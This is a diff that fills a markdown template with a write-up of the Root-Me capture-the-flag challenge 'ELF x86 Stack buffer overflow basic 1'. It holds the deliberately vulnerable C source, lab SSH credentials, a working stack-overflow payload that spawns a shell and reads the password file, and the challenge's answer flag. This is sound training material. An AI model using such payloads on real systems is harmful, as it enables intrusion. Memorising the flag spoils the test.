@@ -1,10 +1,10 @@
-# [Root-Me](./rootme.md) Root-Me App - System Challenges [0/83]
+# [Root-Me](./rootme.md) Root-Me App - System Challenges [1/83]
 
 These challenges will help you understand applicative vulnerabilities. 
 
 ## Contents
 
-1. [ELF x86 - Stack buffer overflow basic 1](#elf-x86-stack-buffer-overflow-basic-1)
+1. [ELF x86 - Stack buffer overflow basic 1](#elf-x86-stack-buffer-overflow-basic-1) 🗸
 2. [ELF x86 - Stack buffer overflow basic 2](#elf-x86-stack-buffer-overflow-basic-2)
 3. [PE32 - Stack buffer overflow basic](#pe32-stack-buffer-overflow-basic)
 4. [ELF x86 - Format string bug basic 1](#elf-x86-format-string-bug-basic-1)
@@ -94,35 +94,161 @@ These challenges will help you understand applicative vulnerabilities.
 
 ---
 
-## ChallengeName
+## ELF x86 Stack buffer overflow basic 1
 
-- Author: name
-- X Points
+- Author: Lyes
+- Date: 25 March 2015
+- Points: 5
+- Level: 1
 
-### Description
+### Statement
 
-Description Here
+Environment configuration:
 
-### Hints
+|-----------|------------------------------------|---|
+| PIE       | Position Independent Executable    | x |
+| ReIRO     | Read Only Relocations              | x |
+| NX        | Non-Executable Stack               | x |
+| Heap exec | Non-Executable Heap                | x |
+| ASLR      | Address Space Layout Randomization | x |
+| SF        | Source Fortification               | x |
+| SRC       | Source code access                 | 🗸 |
+|-----------|------------------------------------|---|
 
-1. Hint 1
+<details>
+
+<summary markdown="span">Source Code</summary>
+
+~~~c
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <stdio.h>
+     
+int main()
+{
+     
+  int var;
+  int check = 0x04030201;
+  char buf[40];
+     
+  fgets(buf,45,stdin);
+     
+  printf("\n[buf]: %s\n", buf);
+  printf("[check] %p\n", check);
+  
+  if ((check != 0x04030201) && (check != 0xdeadbeef))
+    printf ("\nYou are on the right way!\n");
+  
+  if (check == 0xdeadbeef)
+  {
+    printf("Yeah dude! You win!\nOpening your shell...\n");
+    setreuid(geteuid(), geteuid());
+    system("/bin/bash");
+    printf("Shell closed! Bye.\n");
+  }
+  return 0;
+}
+~~~
+
+</details>
 
 ### Connection Details
 
-1. Detail 1
+- Host: challenge02.root-me.org
+- Protocol: SSH
+- Port:2222
+- SSH access: ssh -p 2222 app-systeme-ch13@challenge02.root-me.org 
+- Username: app-systeme-ch13
+- Password: app-systeme-ch13
 
-### Attachments
+### Resources
 
-1. Attachment 1
+1. [youtube](https://www.youtube.com/watch?v=u-OZQkv2ebw).
+2. [buffering in standard streams](https://repository.root-me.org/Administration/Unix/Linux/EN%20-%20buffering%20in%20standard%20streams.pdf).
+3. [Exploiting Stack Buffer Overflows in Linux x86 Kernel](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Stack%20Buffer%20Overflows%20in%20the%20Linux%20x86%20Kernel.pdf).
 
 ### Solutions
 
 <details>
 
-<summary markdown="span">Solution 1</summary>
+<summary markdown="span">Solution</summary>
 
-Detail here
+Reviewing the source code we can see the vulnerability in the buf variable:
 
+~~~c
+char buf[40];     
+fgets(buf,45,stdin);
+~~~
+
+The variable buf is allocated 40 Bytes but the fgets reads 45 Bytes in.  We can overflow the buf buffer and write into the stack.
+
+Connecting, we can see the vulnerability:
+
+~~~shell
+app-systeme-ch13@challenge02:~$ ./ch13
+0000000000000000000000000000000000000000000000
+
+[buf]: 000000000000000000000000000000000000000000000
+[check] 0x3030303030
+
+You are on the right way!
+app-systeme-ch13@challenge02:~$ ./ch13
+0000000000000000000000000000000000000000111111
+
+[buf]: 000000000000000000000000000000000000000011111
+[check] 0x3131313131
+
+You are on the right way!
+~~~
+
+We can see the overflow checks the check variable which is manipulated by the trailing characters (0x31 = "1").  We ncan check the endian-ness of the buffer:
+
+~~~shell
+app-systeme-ch13@challenge02:~$ ./ch13
+000000000000000000000000000000000000000012345
+
+[buf]: 00000000000000000000000000000000000000001234
+[check] 0x34333231
+
+You are on the right way!
+~~~
+  
+This shows us the variable is little-endian.  We need to append a 5-byte statement to generate a correct little-endian value as detailed in the source code:
+
+~~~c
+if (check == 0xdeadbeef)
+~~~
+
+We can use python to insert the hex chars:
+
+~~~shell
+app-systeme-ch13@challenge02:~$ (python -c 'print("0"*40+"\xef\xbe\xad\xde")') | ./ch13
+
+[buf]: 0000000000000000000000000000000000000000ﾭ�
+[check] 0xdeadbeef
+Yeah dude! You win!
+Opening your shell...
+Shell closed! Bye.
+~~~
+
+This opens a shell and immediately closes it.  We need to interrupt it using cat:
+
+~~~shell
+app-systeme-ch13@challenge02:~$ (python -c 'print("0"*40+"\xef\xbe\xad\xde")'; cat) | ./ch13
+
+[buf]: 0000000000000000000000000000000000000000ﾭ�
+[check] 0xdeadbeef
+Yeah dude! You win!
+Opening your shell...
+ls
+ch13  ch13.c  Makefile
+strings .passwd
+1w4ntm0r3pr0np1s
+exit
+Shell closed! Bye.
+~~~
+  
 </details>
 
 ### Answer
@@ -132,7 +258,7 @@ Detail here
 <summary markdown="span">Answer</summary>
 
 ~~~
-
+1w4ntm0r3pr0np1s
 ~~~
 
 </details>
